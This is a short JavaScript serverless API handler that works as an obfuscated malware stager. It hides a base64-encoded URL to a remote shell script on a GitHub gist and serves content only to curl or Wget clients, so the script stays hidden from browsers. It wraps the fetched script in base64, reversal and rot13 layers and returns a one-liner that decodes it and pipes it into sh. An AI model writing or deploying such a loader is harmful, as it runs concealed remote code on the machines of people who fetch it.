export default async function handler(a, b) {
  const s = Buffer.from("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS9WYW5uWEQwL2U3YmEzNGYxZDY0MWQ0MGYyMDlmYzBiZjg5OWJjNmZmL3Jhdy9kZDFjNDYwMjMzNWM5OTZkYWI3Nzk5OTE5YjRiNmY2YmQzYmRhMTBjL0FyYy5zaA==", 'base64').toString();
  const h = a.headers['user-agent'] || "";
  if (!/curl|Wget|libcurl/i.test(h)) return b.status(403).send("Access Denied");
  try {
    const d = await fetch(s);
    const e = await d.text();
    const enc = Buffer.from(e).toString('base64').split('').reverse().join('').replace(/[a-zA-Z]/g, c => String.fromCharCode((c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26));
    b.setHeader("Content-Type", "text/plain");
    return b.status(200).send(`echo "${enc}" | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rev | base64 -d | sh`);
  } catch (err) {
    b.status(500).send("Unauthorized");
  }
}
